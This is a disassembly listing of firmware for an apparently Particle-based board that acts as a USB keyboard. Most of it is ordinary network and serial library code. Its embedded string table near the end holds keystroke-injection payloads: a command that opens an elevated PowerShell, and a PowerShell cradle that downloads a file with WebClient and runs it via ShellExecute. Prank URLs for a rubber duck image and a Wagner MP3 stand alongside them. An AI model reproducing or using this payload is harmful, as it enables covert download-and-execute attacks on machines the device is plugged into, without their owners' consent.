 80a0d5e:	6840      	ldr	r0, [r0, #4]
 80a0d60:	4611      	mov	r1, r2
 80a0d62:	f7ff bb43 	b.w	80a03ec <network_get_listen_timeout>

080a0d66 <_ZN5spark9WiFiClass16setListenTimeoutEt>:
        network_set_listen_timeout(*this, timeout, NULL);
 80a0d66:	2200      	movs	r2, #0
 80a0d68:	6840      	ldr	r0, [r0, #4]
 80a0d6a:	f7ff bb37 	b.w	80a03dc <network_set_listen_timeout>

080a0d6e <_ZN5spark9WiFiClass6listenEb>:
        network_listen(*this, begin ? 0 : 1, NULL);
 80a0d6e:	2200      	movs	r2, #0
 80a0d70:	6840      	ldr	r0, [r0, #4]
 80a0d72:	f081 0101 	eor.w	r1, r1, #1
 80a0d76:	f7ff bb21 	b.w	80a03bc <network_listen>

080a0d7a <_ZN5spark9WiFiClass3offEv>:
        network_off(*this, 0, 0, NULL);
 80a0d7a:	2300      	movs	r3, #0
 80a0d7c:	6840      	ldr	r0, [r0, #4]
 80a0d7e:	461a      	mov	r2, r3
 80a0d80:	4619      	mov	r1, r3
 80a0d82:	f7ff bb13 	b.w	80a03ac <network_off>

080a0d86 <_ZN5spark9WiFiClass2onEv>:
        network_on(*this, 0, 0, NULL);
 80a0d86:	2300      	movs	r3, #0
 80a0d88:	6840      	ldr	r0, [r0, #4]
 80a0d8a:	461a      	mov	r2, r3
 80a0d8c:	4619      	mov	r1, r3
 80a0d8e:	f7ff bb05 	b.w	80a039c <network_on>

080a0d92 <_ZN5spark9WiFiClass10connectingEv>:
        return network_connecting(*this, 0, NULL);
 80a0d92:	2200      	movs	r2, #0
 80a0d94:	6840      	ldr	r0, [r0, #4]
 80a0d96:	4611      	mov	r1, r2
 80a0d98:	f7ff bae8 	b.w	80a036c <network_connecting>

080a0d9c <_ZN5spark9WiFiClass10disconnectEv>:
        network_disconnect(*this, NETWORK_DISCONNECT_REASON_USER, NULL);
 80a0d9c:	2200      	movs	r2, #0
 80a0d9e:	2102      	movs	r1, #2
 80a0da0:	6840      	ldr	r0, [r0, #4]
 80a0da2:	f7ff baeb 	b.w	80a037c <network_disconnect>

080a0da6 <_ZN5spark9WiFiClass7connectEj>:
        network_connect(*this, flags, 0, NULL);
 80a0da6:	2300      	movs	r3, #0
 80a0da8:	6840      	ldr	r0, [r0, #4]
 80a0daa:	461a      	mov	r2, r3
 80a0dac:	f7ff bad6 	b.w	80a035c <network_connect>

080a0db0 <_GLOBAL__sub_I__ZN10WiFiSignalC2ERK21wlan_connected_info_t>:
    static NetworkClass& from(network_interface_t nif);

    virtual IPAddress resolve(const char* name);

    explicit NetworkClass(network_interface_t iface)
            : iface_(iface) {
 80a0db0:	2204      	movs	r2, #4
 80a0db2:	4b02      	ldr	r3, [pc, #8]	; (80a0dbc <_GLOBAL__sub_I__ZN10WiFiSignalC2ERK21wlan_connected_info_t+0xc>)
 80a0db4:	605a      	str	r2, [r3, #4]
            NetworkClass(NETWORK_INTERFACE_WIFI_STA) {
 80a0db6:	4a02      	ldr	r2, [pc, #8]	; (80a0dc0 <_GLOBAL__sub_I__ZN10WiFiSignalC2ERK21wlan_connected_info_t+0x10>)
 80a0db8:	601a      	str	r2, [r3, #0]
the same way.
*****************************************************************************/

    WiFiClass WiFi;
    // NetworkClass& Network = WiFi;
}
 80a0dba:	4770      	bx	lr
 80a0dbc:	200000e4 	.word	0x200000e4
 80a0dc0:	080a1420 	.word	0x080a1420

080a0dc4 <_ZN5spark12NetworkClass7connectEj>:
        return Network;
    }
}

void NetworkClass::connect(unsigned flags) {
    network_connect(*this, flags, 0, nullptr);
 80a0dc4:	2300      	movs	r3, #0
 80a0dc6:	6840      	ldr	r0, [r0, #4]
 80a0dc8:	461a      	mov	r2, r3
 80a0dca:	f7ff bac7 	b.w	80a035c <network_connect>

080a0dce <_ZN5spark12NetworkClass10disconnectEv>:
}

void NetworkClass::disconnect() {
    network_disconnect(*this, NETWORK_DISCONNECT_REASON_USER, nullptr);
 80a0dce:	2200      	movs	r2, #0
 80a0dd0:	2102      	movs	r1, #2
 80a0dd2:	6840      	ldr	r0, [r0, #4]
 80a0dd4:	f7ff bad2 	b.w	80a037c <network_disconnect>

080a0dd8 <_ZN5spark12NetworkClass10connectingEv>:
}

bool NetworkClass::connecting() {
    return network_connecting(*this, 0, nullptr);
 80a0dd8:	2200      	movs	r2, #0
 80a0dda:	6840      	ldr	r0, [r0, #4]
 80a0ddc:	4611      	mov	r1, r2
 80a0dde:	f7ff bac5 	b.w	80a036c <network_connecting>

080a0de2 <_ZN5spark12NetworkClass5readyEv>:
}

bool NetworkClass::ready() {
    return network_ready(*this, 0, nullptr);
 80a0de2:	2200      	movs	r2, #0
 80a0de4:	6840      	ldr	r0, [r0, #4]
 80a0de6:	4611      	mov	r1, r2
 80a0de8:	f7ff bad0 	b.w	80a038c <network_ready>

080a0dec <_ZN5spark12NetworkClass2onEv>:
}

void NetworkClass::on() {
    network_on(*this, 0, 0, nullptr);
 80a0dec:	2300      	movs	r3, #0
 80a0dee:	6840      	ldr	r0, [r0, #4]
 80a0df0:	461a      	mov	r2, r3
 80a0df2:	4619      	mov	r1, r3
 80a0df4:	f7ff bad2 	b.w	80a039c <network_on>

080a0df8 <_ZN5spark12NetworkClass3offEv>:
}

void NetworkClass::off() {
    network_off(*this, 0, 0, nullptr);
 80a0df8:	2300      	movs	r3, #0
 80a0dfa:	6840      	ldr	r0, [r0, #4]
 80a0dfc:	461a      	mov	r2, r3
 80a0dfe:	4619      	mov	r1, r3
 80a0e00:	f7ff bad4 	b.w	80a03ac <network_off>

080a0e04 <_ZN5spark12NetworkClass4isOnEv>:
}

bool NetworkClass::isOn() {
    return network_is_on(*this, nullptr);
 80a0e04:	2100      	movs	r1, #0
 80a0e06:	6840      	ldr	r0, [r0, #4]
 80a0e08:	f7ff baf8 	b.w	80a03fc <network_is_on>

080a0e0c <_ZN5spark12NetworkClass5isOffEv>:
}

bool NetworkClass::isOff() {
    return network_is_off(*this, nullptr);
 80a0e0c:	2100      	movs	r1, #0
 80a0e0e:	6840      	ldr	r0, [r0, #4]
 80a0e10:	f7ff bafc 	b.w	80a040c <network_is_off>

080a0e14 <_ZN5spark12NetworkClass6listenEb>:
}

void NetworkClass::listen(bool begin) {
    network_listen(*this, begin ? 0 : 1, nullptr);
 80a0e14:	2200      	movs	r2, #0
 80a0e16:	6840      	ldr	r0, [r0, #4]
 80a0e18:	f081 0101 	eor.w	r1, r1, #1
 80a0e1c:	f7ff bace 	b.w	80a03bc <network_listen>

080a0e20 <_ZN5spark12NetworkClass16setListenTimeoutEt>:
}

void NetworkClass::setListenTimeout(uint16_t timeout) {
    network_set_listen_timeout(*this, timeout, nullptr);
 80a0e20:	2200      	movs	r2, #0
 80a0e22:	6840      	ldr	r0, [r0, #4]
 80a0e24:	f7ff bada 	b.w	80a03dc <network_set_listen_timeout>

080a0e28 <_ZN5spark12NetworkClass16getListenTimeoutEv>:
}

uint16_t NetworkClass::getListenTimeout() {
    return network_get_listen_timeout(*this, 0, nullptr);
 80a0e28:	2200      	movs	r2, #0
 80a0e2a:	6840      	ldr	r0, [r0, #4]
 80a0e2c:	4611      	mov	r1, r2
 80a0e2e:	f7ff badd 	b.w	80a03ec <network_get_listen_timeout>

080a0e32 <_ZN5spark12NetworkClass9listeningEv>:
}

bool NetworkClass::listening() {
    return network_listening(*this, 0, nullptr);
 80a0e32:	2200      	movs	r2, #0
 80a0e34:	6840      	ldr	r0, [r0, #4]
 80a0e36:	4611      	mov	r1, r2
 80a0e38:	f7ff bac8 	b.w	80a03cc <network_listening>

080a0e3c <_ZN5spark12NetworkClass7resolveEPKc>:
}

IPAddress NetworkClass::resolve(const char* name) {
 80a0e3c:	b570      	push	{r4, r5, r6, lr}
 80a0e3e:	4615      	mov	r5, r2
 80a0e40:	b08e      	sub	sp, #56	; 0x38
 80a0e42:	4604      	mov	r4, r0
    IPAddress addr;
 80a0e44:	a808      	add	r0, sp, #32
 80a0e46:	f7ff fe21 	bl	80a0a8c <_ZN9IPAddressC1Ev>
        HAL_IPAddress ip = {};
 80a0e4a:	2211      	movs	r2, #17
 80a0e4c:	2100      	movs	r1, #0
 80a0e4e:	a803      	add	r0, sp, #12
 80a0e50:	f000 f88a 	bl	80a0f68 <memset>
        return (inet_gethostbyname(name, strlen(name), &ip, *this, NULL) != 0) ?
 80a0e54:	2600      	movs	r6, #0
 80a0e56:	4628      	mov	r0, r5
 80a0e58:	f000 f8c4 	bl	80a0fe4 <strlen>
 80a0e5c:	4b0a      	ldr	r3, [pc, #40]	; (80a0e88 <_ZN5spark12NetworkClass7resolveEPKc+0x4c>)
 80a0e5e:	9600      	str	r6, [sp, #0]
 80a0e60:	b281      	uxth	r1, r0
 80a0e62:	685b      	ldr	r3, [r3, #4]
 80a0e64:	4628      	mov	r0, r5
 80a0e66:	aa03      	add	r2, sp, #12
 80a0e68:	f7ff fa4c 	bl	80a0304 <inet_gethostbyname>
                IPAddress(uint32_t(0)) : IPAddress(ip);
 80a0e6c:	b130      	cbz	r0, 80a0e7c <_ZN5spark12NetworkClass7resolveEPKc+0x40>
 80a0e6e:	4631      	mov	r1, r6
 80a0e70:	4620      	mov	r0, r4
 80a0e72:	f7ff fe2b 	bl	80a0acc <_ZN9IPAddressC1Em>
    return Cellular.resolve(name);
#endif // Wiring_Cellular

#endif // HAL_USE_INET_HAL_POSIX
    return addr;
}
 80a0e76:	4620      	mov	r0, r4
 80a0e78:	b00e      	add	sp, #56	; 0x38
 80a0e7a:	bd70      	pop	{r4, r5, r6, pc}
 80a0e7c:	4620      	mov	r0, r4
 80a0e7e:	a903      	add	r1, sp, #12
 80a0e80:	f7ff fe12 	bl	80a0aa8 <_ZN9IPAddressC1ERK16_HAL_IPAddress_t>
    virtual ~IPAddress() {}
 80a0e84:	e7f7      	b.n	80a0e76 <_ZN5spark12NetworkClass7resolveEPKc+0x3a>
 80a0e86:	bf00      	nop
 80a0e88:	200000e4 	.word	0x200000e4

080a0e8c <_GLOBAL__sub_I__ZN5spark7NetworkE>:
 80a0e8c:	4b02      	ldr	r3, [pc, #8]	; (80a0e98 <_GLOBAL__sub_I__ZN5spark7NetworkE+0xc>)
 80a0e8e:	4a03      	ldr	r2, [pc, #12]	; (80a0e9c <_GLOBAL__sub_I__ZN5spark7NetworkE+0x10>)
 80a0e90:	601a      	str	r2, [r3, #0]
 80a0e92:	2200      	movs	r2, #0
 80a0e94:	605a      	str	r2, [r3, #4]

} // spark
 80a0e96:	4770      	bx	lr
 80a0e98:	200000ec 	.word	0x200000ec
 80a0e9c:	080a145c 	.word	0x080a145c

080a0ea0 <__tcf_0>:
}
#endif

USARTSerial& __fetch_global_Serial1()
{
    static USARTSerial serial1(HAL_USART_SERIAL1, acquireSerial1Buffer());
 80a0ea0:	4770      	bx	lr
	...

080a0ea4 <_Z20acquireSerial1Bufferv>:
{
 80a0ea4:	b570      	push	{r4, r5, r6, lr}
    hal_usart_buffer_config_t config = {
 80a0ea6:	2514      	movs	r5, #20
{
 80a0ea8:	4604      	mov	r4, r0
    hal_usart_buffer_config_t config = {
 80a0eaa:	462a      	mov	r2, r5
 80a0eac:	2100      	movs	r1, #0
 80a0eae:	f000 f85b 	bl	80a0f68 <memset>
 80a0eb2:	8025      	strh	r5, [r4, #0]
 80a0eb4:	2580      	movs	r5, #128	; 0x80
        .rx_buffer = new (std::nothrow) uint8_t[bufferSize],
 80a0eb6:	4e07      	ldr	r6, [pc, #28]	; (80a0ed4 <_Z20acquireSerial1Bufferv+0x30>)
 80a0eb8:	4628      	mov	r0, r5
 80a0eba:	4631      	mov	r1, r6
    hal_usart_buffer_config_t config = {
 80a0ebc:	8125      	strh	r5, [r4, #8]
 80a0ebe:	8225      	strh	r5, [r4, #16]
        .rx_buffer = new (std::nothrow) uint8_t[bufferSize],
 80a0ec0:	f000 f83c 	bl	80a0f3c <_ZnajRKSt9nothrow_t>
        .tx_buffer = new (std::nothrow) uint8_t[bufferSize],
 80a0ec4:	4631      	mov	r1, r6
    };
 80a0ec6:	6060      	str	r0, [r4, #4]
        .tx_buffer = new (std::nothrow) uint8_t[bufferSize],
 80a0ec8:	4628      	mov	r0, r5
 80a0eca:	f000 f837 	bl	80a0f3c <_ZnajRKSt9nothrow_t>
    };
 80a0ece:	60e0      	str	r0, [r4, #12]
}
 80a0ed0:	4620      	mov	r0, r4
 80a0ed2:	bd70      	pop	{r4, r5, r6, pc}
 80a0ed4:	080a1490 	.word	0x080a1490

080a0ed8 <_Z22__fetch_global_Serial1v>:
{
 80a0ed8:	b530      	push	{r4, r5, lr}
    static USARTSerial serial1(HAL_USART_SERIAL1, acquireSerial1Buffer());
 80a0eda:	4d0e      	ldr	r5, [pc, #56]	; (80a0f14 <_Z22__fetch_global_Serial1v+0x3c>)
{
 80a0edc:	b087      	sub	sp, #28
    static USARTSerial serial1(HAL_USART_SERIAL1, acquireSerial1Buffer());
 80a0ede:	7829      	ldrb	r1, [r5, #0]
 80a0ee0:	f3bf 8f5b 	dmb	ish
 80a0ee4:	f011 0401 	ands.w	r4, r1, #1
 80a0ee8:	d111      	bne.n	80a0f0e <_Z22__fetch_global_Serial1v+0x36>
 80a0eea:	4628      	mov	r0, r5
 80a0eec:	f7ff f8d7 	bl	80a009e <__cxa_guard_acquire>
 80a0ef0:	b168      	cbz	r0, 80a0f0e <_Z22__fetch_global_Serial1v+0x36>
 80a0ef2:	a801      	add	r0, sp, #4
 80a0ef4:	f7ff ffd6 	bl	80a0ea4 <_Z20acquireSerial1Bufferv>
 80a0ef8:	4621      	mov	r1, r4
 80a0efa:	aa01      	add	r2, sp, #4
 80a0efc:	4806      	ldr	r0, [pc, #24]	; (80a0f18 <_Z22__fetch_global_Serial1v+0x40>)
 80a0efe:	f7ff feed 	bl	80a0cdc <_ZN11USARTSerialC1E21hal_usart_interface_tRK25hal_usart_buffer_config_t>
 80a0f02:	4628      	mov	r0, r5
 80a0f04:	f7ff f8d0 	bl	80a00a8 <__cxa_guard_release>
 80a0f08:	4804      	ldr	r0, [pc, #16]	; (80a0f1c <_Z22__fetch_global_Serial1v+0x44>)
 80a0f0a:	f000 f819 	bl	80a0f40 <atexit>
    return serial1;
}
 80a0f0e:	4802      	ldr	r0, [pc, #8]	; (80a0f18 <_Z22__fetch_global_Serial1v+0x40>)
 80a0f10:	b007      	add	sp, #28
 80a0f12:	bd30      	pop	{r4, r5, pc}
 80a0f14:	200000f4 	.word	0x200000f4
 80a0f18:	200000f8 	.word	0x200000f8
 80a0f1c:	080a0ea1 	.word	0x080a0ea1

080a0f20 <_GLOBAL__sub_I_INADDR_NONE>:
#include "spark_wiring_ipaddress.h"

#if !HAL_USE_SOCKET_HAL_POSIX
const IPAddress INADDR_NONE(0, 0, 0, 0);
 80a0f20:	2300      	movs	r3, #0
 80a0f22:	b507      	push	{r0, r1, r2, lr}
 80a0f24:	461a      	mov	r2, r3
 80a0f26:	4619      	mov	r1, r3
 80a0f28:	9300      	str	r3, [sp, #0]
 80a0f2a:	4803      	ldr	r0, [pc, #12]	; (80a0f38 <_GLOBAL__sub_I_INADDR_NONE+0x18>)
 80a0f2c:	f7ff fde4 	bl	80a0af8 <_ZN9IPAddressC1Ehhhh>
 80a0f30:	b003      	add	sp, #12
 80a0f32:	f85d fb04 	ldr.w	pc, [sp], #4
 80a0f36:	bf00      	nop
 80a0f38:	20000110 	.word	0x20000110

080a0f3c <_ZnajRKSt9nothrow_t>:
 80a0f3c:	f7ff b8ab 	b.w	80a0096 <_Znaj>

080a0f40 <atexit>:
 80a0f40:	2300      	movs	r3, #0
 80a0f42:	4601      	mov	r1, r0
 80a0f44:	461a      	mov	r2, r3
 80a0f46:	4618      	mov	r0, r3
 80a0f48:	f000 b854 	b.w	80a0ff4 <__register_exitproc>

080a0f4c <memcpy>:
 80a0f4c:	440a      	add	r2, r1
 80a0f4e:	4291      	cmp	r1, r2
 80a0f50:	f100 33ff 	add.w	r3, r0, #4294967295
 80a0f54:	d100      	bne.n	80a0f58 <memcpy+0xc>
 80a0f56:	4770      	bx	lr
 80a0f58:	b510      	push	{r4, lr}
 80a0f5a:	f811 4b01 	ldrb.w	r4, [r1], #1
 80a0f5e:	4291      	cmp	r1, r2
 80a0f60:	f803 4f01 	strb.w	r4, [r3, #1]!
 80a0f64:	d1f9      	bne.n	80a0f5a <memcpy+0xe>
 80a0f66:	bd10      	pop	{r4, pc}

080a0f68 <memset>:
 80a0f68:	4603      	mov	r3, r0
 80a0f6a:	4402      	add	r2, r0
 80a0f6c:	4293      	cmp	r3, r2
 80a0f6e:	d100      	bne.n	80a0f72 <memset+0xa>
 80a0f70:	4770      	bx	lr
 80a0f72:	f803 1b01 	strb.w	r1, [r3], #1
 80a0f76:	e7f9      	b.n	80a0f6c <memset+0x4>

080a0f78 <srand>:
 80a0f78:	b538      	push	{r3, r4, r5, lr}
 80a0f7a:	4b10      	ldr	r3, [pc, #64]	; (80a0fbc <srand+0x44>)
 80a0f7c:	4604      	mov	r4, r0
 80a0f7e:	681d      	ldr	r5, [r3, #0]
 80a0f80:	6bab      	ldr	r3, [r5, #56]	; 0x38
 80a0f82:	b9b3      	cbnz	r3, 80a0fb2 <srand+0x3a>
 80a0f84:	2018      	movs	r0, #24
 80a0f86:	f7ff fa51 	bl	80a042c <malloc>
 80a0f8a:	4602      	mov	r2, r0
 80a0f8c:	63a8      	str	r0, [r5, #56]	; 0x38
 80a0f8e:	b920      	cbnz	r0, 80a0f9a <srand+0x22>
 80a0f90:	2142      	movs	r1, #66	; 0x42
 80a0f92:	4b0b      	ldr	r3, [pc, #44]	; (80a0fc0 <srand+0x48>)
 80a0f94:	480b      	ldr	r0, [pc, #44]	; (80a0fc4 <srand+0x4c>)
 80a0f96:	f7ff fa61 	bl	80a045c <__assert_func>
 80a0f9a:	490b      	ldr	r1, [pc, #44]	; (80a0fc8 <srand+0x50>)
 80a0f9c:	4b0b      	ldr	r3, [pc, #44]	; (80a0fcc <srand+0x54>)
 80a0f9e:	e9c0 1300 	strd	r1, r3, [r0]
 80a0fa2:	4b0b      	ldr	r3, [pc, #44]	; (80a0fd0 <srand+0x58>)
 80a0fa4:	2100      	movs	r1, #0
 80a0fa6:	6083      	str	r3, [r0, #8]
 80a0fa8:	230b      	movs	r3, #11
 80a0faa:	8183      	strh	r3, [r0, #12]
 80a0fac:	2001      	movs	r0, #1
 80a0fae:	e9c2 0104 	strd	r0, r1, [r2, #16]
 80a0fb2:	2200      	movs	r2, #0
 80a0fb4:	6bab      	ldr	r3, [r5, #56]	; 0x38
 80a0fb6:	611c      	str	r4, [r3, #16]
 80a0fb8:	615a      	str	r2, [r3, #20]
 80a0fba:	bd38      	pop	{r3, r4, r5, pc}
 80a0fbc:	20000004 	.word	0x20000004
 80a0fc0:	080a1491 	.word	0x080a1491
 80a0fc4:	080a14a8 	.word	0x080a14a8
 80a0fc8:	abcd330e 	.word	0xabcd330e
 80a0fcc:	e66d1234 	.word	0xe66d1234
 80a0fd0:	0005deec 	.word	0x0005deec

080a0fd4 <strcpy>:
 80a0fd4:	4603      	mov	r3, r0
 80a0fd6:	f811 2b01 	ldrb.w	r2, [r1], #1
 80a0fda:	f803 2b01 	strb.w	r2, [r3], #1
 80a0fde:	2a00      	cmp	r2, #0
 80a0fe0:	d1f9      	bne.n	80a0fd6 <strcpy+0x2>
 80a0fe2:	4770      	bx	lr

080a0fe4 <strlen>:
 80a0fe4:	4603      	mov	r3, r0
 80a0fe6:	f813 2b01 	ldrb.w	r2, [r3], #1
 80a0fea:	2a00      	cmp	r2, #0
 80a0fec:	d1fb      	bne.n	80a0fe6 <strlen+0x2>
 80a0fee:	1a18      	subs	r0, r3, r0
 80a0ff0:	3801      	subs	r0, #1
 80a0ff2:	4770      	bx	lr

080a0ff4 <__register_exitproc>:
 80a0ff4:	e92d 43f8 	stmdb	sp!, {r3, r4, r5, r6, r7, r8, r9, lr}
 80a0ff8:	f8df 80ac 	ldr.w	r8, [pc, #172]	; 80a10a8 <__register_exitproc+0xb4>
 80a0ffc:	4606      	mov	r6, r0
 80a0ffe:	f8d8 0000 	ldr.w	r0, [r8]
 80a1002:	461f      	mov	r7, r3
 80a1004:	460d      	mov	r5, r1
 80a1006:	4691      	mov	r9, r2
 80a1008:	f000 f858 	bl	80a10bc <__retarget_lock_acquire_recursive>
 80a100c:	4b27      	ldr	r3, [pc, #156]	; (80a10ac <__register_exitproc+0xb8>)
 80a100e:	681c      	ldr	r4, [r3, #0]
 80a1010:	b934      	cbnz	r4, 80a1020 <__register_exitproc+0x2c>
 80a1012:	4c27      	ldr	r4, [pc, #156]	; (80a10b0 <__register_exitproc+0xbc>)
 80a1014:	601c      	str	r4, [r3, #0]
 80a1016:	4b27      	ldr	r3, [pc, #156]	; (80a10b4 <__register_exitproc+0xc0>)
 80a1018:	b113      	cbz	r3, 80a1020 <__register_exitproc+0x2c>
 80a101a:	681b      	ldr	r3, [r3, #0]
 80a101c:	f8c4 3088 	str.w	r3, [r4, #136]	; 0x88
 80a1020:	6863      	ldr	r3, [r4, #4]
 80a1022:	2b1f      	cmp	r3, #31
 80a1024:	dd07      	ble.n	80a1036 <__register_exitproc+0x42>
 80a1026:	f8d8 0000 	ldr.w	r0, [r8]
 80a102a:	f000 f849 	bl	80a10c0 <__retarget_lock_release_recursive>
 80a102e:	f04f 30ff 	mov.w	r0, #4294967295
 80a1032:	e8bd 83f8 	ldmia.w	sp!, {r3, r4, r5, r6, r7, r8, r9, pc}
 80a1036:	b35e      	cbz	r6, 80a1090 <__register_exitproc+0x9c>
 80a1038:	f8d4 0088 	ldr.w	r0, [r4, #136]	; 0x88
 80a103c:	b988      	cbnz	r0, 80a1062 <__register_exitproc+0x6e>
 80a103e:	4b1e      	ldr	r3, [pc, #120]	; (80a10b8 <__register_exitproc+0xc4>)
 80a1040:	b923      	cbnz	r3, 80a104c <__register_exitproc+0x58>
 80a1042:	f8d8 0000 	ldr.w	r0, [r8]
 80a1046:	f000 f83a 	bl	80a10be <__retarget_lock_release>
 80a104a:	e7f0      	b.n	80a102e <__register_exitproc+0x3a>
 80a104c:	f44f 7084 	mov.w	r0, #264	; 0x108
 80a1050:	f7ff f9ec 	bl	80a042c <malloc>
 80a1054:	2800      	cmp	r0, #0
 80a1056:	d0f4      	beq.n	80a1042 <__register_exitproc+0x4e>
 80a1058:	2300      	movs	r3, #0
 80a105a:	e9c0 3340 	strd	r3, r3, [r0, #256]	; 0x100
 80a105e:	f8c4 0088 	str.w	r0, [r4, #136]	; 0x88
 80a1062:	2201      	movs	r2, #1
 80a1064:	6863      	ldr	r3, [r4, #4]
 80a1066:	2e02      	cmp	r6, #2
 80a1068:	f840 9023 	str.w	r9, [r0, r3, lsl #2]
 80a106c:	fa02 f203 	lsl.w	r2, r2, r3
 80a1070:	eb00 0183 	add.w	r1, r0, r3, lsl #2
 80a1074:	f8d0 3100 	ldr.w	r3, [r0, #256]	; 0x100
 80a1078:	ea43 0302 	orr.w	r3, r3, r2
 80a107c:	f8c0 3100 	str.w	r3, [r0, #256]	; 0x100
 80a1080:	f8c1 7080 	str.w	r7, [r1, #128]	; 0x80
 80a1084:	bf02      	ittt	eq
 80a1086:	f8d0 3104 	ldreq.w	r3, [r0, #260]	; 0x104
 80a108a:	4313      	orreq	r3, r2
 80a108c:	f8c0 3104 	streq.w	r3, [r0, #260]	; 0x104
 80a1090:	6863      	ldr	r3, [r4, #4]
 80a1092:	f8d8 0000 	ldr.w	r0, [r8]
 80a1096:	1c5a      	adds	r2, r3, #1
 80a1098:	3302      	adds	r3, #2
 80a109a:	6062      	str	r2, [r4, #4]
 80a109c:	f844 5023 	str.w	r5, [r4, r3, lsl #2]
 80a10a0:	f000 f80e 	bl	80a10c0 <__retarget_lock_release_recursive>
 80a10a4:	2000      	movs	r0, #0
 80a10a6:	e7c4      	b.n	80a1032 <__register_exitproc+0x3e>
 80a10a8:	20000068 	.word	0x20000068
 80a10ac:	200001b4 	.word	0x200001b4
 80a10b0:	20000128 	.word	0x20000128
 80a10b4:	00000000 	.word	0x00000000
 80a10b8:	080a042d 	.word	0x080a042d

080a10bc <__retarget_lock_acquire_recursive>:
 80a10bc:	4770      	bx	lr

080a10be <__retarget_lock_release>:
 80a10be:	4770      	bx	lr

080a10c0 <__retarget_lock_release_recursive>:
 80a10c0:	4770      	bx	lr

080a10c2 <link_code_end>:
	...

080a10c4 <dynalib_user>:
 80a10c4:	001d 080a 005d 080a 0085 080a 0089 080a     ....]...........
 80a10d4:	0000 0000 7468 7074 3a73 2f2f 7777 2e77     ....https://www.
 80a10e4:	756d 636e 6b68 6e69 632e 6d6f 6d2f 6465     munchkin.com/med
 80a10f4:	6169 632f 7461 6c61 676f 702f 6f72 7564     ia/catalog/produ
 80a1104:	7463 332f 312f 332f 3031 3130 775f 6968     ct/3/1/31001_whi
 80a1114:	6574 685f 746f 735f 6661 7465 5f79 6162     te_hot_safety_ba
 80a1124:	6874 645f 6375 796b 6a2e 6770 6800 7474     th_ducky.jpg.htt
 80a1134:	7370 2f3a 692f 3661 3030 3032 2e39 7375     ps://ia600209.us
 80a1144:	612e 6372 6968 6576 6f2e 6772 332f 2f32     .archive.org/32/
 80a1154:	7469 6d65 2f73 6157 6e67 7265 6854 5265     items/WagnerTheR
 80a1164:	6469 4f65 5466 6568 6156 6b6c 7279 6569     ideOfTheValkyrie
 80a1174:	2f73 6157 6e67 7265 6854 5265 6469 4f65     s/WagnerTheRideO
 80a1184:	5466 6568 6156 6b6c 7279 6569 7773 7777     fTheValkyrieswww
 80a1194:	6b2e 6565 7670 6469 632e 6d6f 6d2e 3370     .keepvid.com.mp3
 80a11a4:	7000 776f 7265 6873 6c65 206c 7453 7261     .powershell Star
 80a11b4:	2d74 7250 636f 7365 2073 6f70 6577 7372     t-Process powers
 80a11c4:	6568 6c6c 2d20 6556 6272 7220 6e75 7341     hell -Verb runAs
 80a11d4:	5b00 654e 2e74 6553 7672 6369 5065 696f     .[Net.ServicePoi
 80a11e4:	746e 614d 616e 6567 5d72 3a3a 6553 7563     ntManager]::Secu
 80a11f4:	6972 7974 7250 746f 636f 6c6f 3d20 2720     rityProtocol = '
 80a1204:	6c74 3173 2c32 7420 736c 3131 202c 6c74     tls12, tls11, tl
 80a1214:	2773 203b 6424 776f 206e 203d 654e 2d77     s'; $down = New-
 80a1224:	624f 656a 7463 5320 7379 6574 2e6d 654e     Object System.Ne
 80a1234:	2e74 6557 4362 696c 6e65 3b74 2420 7275     t.WebClient; $ur
 80a1244:	206c 203d 0027 3b27 2420 6966 656c 3d20     l = '.'; $file =
 80a1254:	2720 2700 203b 6424 776f 2e6e 6f44 6e77      '.'; $down.Down
 80a1264:	6f6c 6461 6946 656c 2428 7275 2c6c 6624     loadFile($url,$f
 80a1274:	6c69 2965 203b 6524 6578 2063 203d 654e     ile); $exec = Ne
 80a1284:	2d77 624f 656a 7463 2d20 6f63 206d 6873     w-Object -com sh
 80a1294:	6c65 2e6c 7061 6c70 6369 7461 6f69 3b6e     ell.application;
 80a12a4:	2420 7865 6365 732e 6568 6c6c 7865 6365      $exec.shellexec
 80a12b4:	7475 2865 5024 5353 7263 7069 5274 6f6f     ute($PSScriptRoo
 80a12c4:	2074 202b 6624 6c69 2965 203b 7865 7469     t + $file); exit
 80a12d4:	003b 7061 0070 5925 252d 2d6d 6425 2554     ;.app.%Y-%m-%dT%
 80a12e4:	3a48 4d25 253a 2553 007a 7361 7463 6d69     H:%M:%S%z.asctim
 80a12f4:	0065 0000                                   e...

080a12f8 <_ZTV11USBKeyboard>:
	...
 80a1300:	06bd 080a 06bf 080a 06cd 080a 05c9 080a     ................
 80a1310:	0695 080a 06b5 080a 0783 080a 0823 080a     ............#...
 80a1320:	08a1 080a                                   ....

080a1324 <usb_hid_asciimap>:
	...
 80a132c:	2b2a 0028 0000 0000 0000 0000 0000 0000     *+(.............
 80a133c:	0000 2900 0000 0000 9e2c a0b4 a2a1 34a4     ...)....,......4
 80a134c:	a7a6 aea5 2d36 3837 1e27 201f 2221 2423     ....6-78'.. !"#$
 80a135c:	2625 33b3 2eb6 b8b7 849f 8685 8887 8a89     %&.3............
 80a136c:	8c8b 8e8d 908f 9291 9493 9695 9897 9a99     ................
 80a137c:	9c9b 2f9d 3031 ada3 0435 0605 0807 0a09     .../10..5.......
 80a138c:	0c0b 0e0d 100f 1211 1413 1615 1817 1a19     ................
 80a139c:	1c1b af1d b0b1 4cb5                         .......L

080a13a4 <_ZTV9IPAddress>:
	...
 80a13ac:	0a4b 080a 0a49 080a 0a7d 080a               K...I...}...

080a13b8 <_ZTV9USBSerial>:
	...
 80a13c0:	0b17 080a 0b7d 080a 0b55 080a 05c9 080a     ....}...U.......
 80a13d0:	0b47 080a 0b19 080a 0b29 080a 0b77 080a     G.......)...w...
 80a13e0:	0b39 080a 0b11 080a                         9.......

080a13e8 <_ZTV11USARTSerial>:
	...
 80a13f0:	0c65 080a 0ccd 080a 0ca9 080a 05c9 080a     e...............
 80a1400:	0c79 080a 0c95 080a 0c87 080a 0ca3 080a     y...............
 80a1410:	0c67 080a 0c6b 080a                         g...k...

080a1418 <_ZTVN5spark9WiFiClassE>:
	...
 80a1420:	0da7 080a 0d9d 080a 0d93 080a 0d05 080a     ................
 80a1430:	0d87 080a 0d7b 080a 0e05 080a 0e0d 080a     ....{...........
 80a1440:	0d6f 080a 0d67 080a 0d5d 080a 0d53 080a     o...g...]...S...
 80a1450:	0d0f 080a                                   ....

080a1454 <_ZTVN5spark12NetworkClassE>:
	...
 80a145c:	0dc5 080a 0dcf 080a 0dd9 080a 0de3 080a     ................
 80a146c:	0ded 080a 0df9 080a 0e05 080a 0e0d 080a     ................
